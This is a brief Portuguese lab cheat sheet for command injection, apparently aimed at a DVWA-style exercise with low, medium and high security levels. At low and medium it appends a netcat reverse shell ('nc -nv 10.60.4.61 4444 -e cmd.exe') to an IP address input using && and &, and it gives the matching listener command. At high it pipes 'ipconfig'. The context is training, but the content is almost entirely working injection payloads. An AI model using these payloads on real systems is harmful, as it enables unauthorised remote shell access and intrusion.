Command Injection

Security Level: LOW

1 = No command Injection, vamos executar um comando

Enter an IP address: 10.60.4.61 && cd /netcat && nc -nv  10.60.4.61 4444 -e cmd.exe     

2 = Na máquina que for receber a conexão, é só digitar

nc -nvlp 4444

#########################################################

Security Level: MIDDLE

1 = No command Injection, vamos fazer executar um comando

10.60.4.61 & cd /netcat &  nc -nv 10.60.4.61 4444 -e cmd.exe

Obs: & = executa todos os comandos independente do retorno.

#########################################################

Security Level: HIGH

1 = No command Injection, vamos fazer executar um comando

10.60.4.61|ipconfig